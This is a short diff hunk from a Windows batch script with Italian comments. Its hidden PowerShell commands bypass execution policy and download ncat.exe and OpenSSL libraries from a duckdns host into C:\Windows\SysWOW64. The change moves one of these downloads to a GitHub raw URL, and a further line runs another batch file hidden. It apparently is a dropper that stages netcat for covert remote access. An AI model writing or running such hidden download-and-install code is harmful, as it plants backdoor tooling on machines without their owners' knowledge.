@@ -22,7 +22,7 @@ Invoke-WebRequest -Uri "http://shadingfile.duckdns.org/media/ncat795/ncat.exe" -
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
 Invoke-WebRequest -Uri "http://shadingfile.duckdns.org/media/ncat795/libcrypto-3.dll" -OutFile "C:\Windows\SysWOW64\libcrypto-3.dll" > $null
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
-Invoke-WebRequest -Uri "http://shadingfile.duckdns.org/media/ncat795/libssl-3.dll" -OutFile "C:\Windows\SysWOW64\libssl-3.dll" > $null
+Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libssl-3.dll" -OutFile "C:\Windows\SysWOW64\libssl-3.dll" > $null
 
 timeout /t 2 >nul
 :: Esegui wait_R.bat in modo nascosto
